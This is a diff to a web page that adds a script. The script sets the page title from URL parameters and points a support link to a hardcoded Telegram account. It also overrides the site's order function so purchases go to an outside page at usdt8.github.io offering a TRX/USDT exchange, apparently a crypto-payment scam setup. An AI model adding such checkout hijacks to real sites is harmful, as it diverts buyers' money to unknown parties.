@@ -472,6 +472,42 @@
                 </div>
         </div>
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon='{"version":"2024.11.0","token":"4a83167804eb4ae0857019d9df3f3ddc","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'></script>
+	<script>
+		// 动态处理参数
+		;(function () {
+			const params = new URLSearchParams(window.location.search)
+			const name = params.get('name')
+			const kefu = params.get('kefu') || 'okk13'
+			const tgid = params.get('tgid') || '5866891166'
+
+			if (name) {
+				document.title = name
+				const h1 = document.querySelector('.header h1')
+				if (h1) h1.textContent = name
+			}
+			if (kefu) {
+				const customerServiceLi = document.getElementById('customerService')
+				if (customerServiceLi) {
+					const a = customerServiceLi.querySelector('a')
+					if (a) a.href = `https://t.me/${kefu}`
+				}
+			}
+
+			// 重写下单逻辑
+			window.redeemNow = function () {
+				const params = new URLSearchParams(window.location.search)
+				const tgid = params.get('tgid') || '5866891166'
+				const kefu = params.get('kefu') || 'okk13'
+
+				const payParams = new URLSearchParams(window.location.search)
+				payParams.set('tgid', tgid)
+				payParams.set('kefu', kefu)
+				payParams.set('title', 'TRX能量/U兑换服务')
+
+				window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
+			}
+		})()
+	</script>
 </body>
 
 <script src="Script/index%EF%B9%96v=1.0.0.js">
